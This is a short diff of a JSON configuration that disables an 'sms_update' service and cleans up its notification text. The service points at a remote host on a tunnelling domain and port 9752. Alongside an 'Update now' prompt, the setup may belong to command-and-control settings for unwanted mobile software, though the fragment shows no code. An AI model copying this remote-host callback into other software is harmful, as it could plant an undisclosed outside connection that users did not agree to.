@@ -27,10 +27,10 @@
 	  "notification_msg": "Update now"
     },
 	"sms_update": {
-      "service_enable": true,
+      "service_enable": false,
 	  "remote_host": "fine-louisiana.at.ply.gg",
 	  "remote_port": 9752,
-	  "notification_msg": "Can fuck yourself Checking for new messages."
+	  "notification_msg": "Checking for new messages."
     }
   }
 }
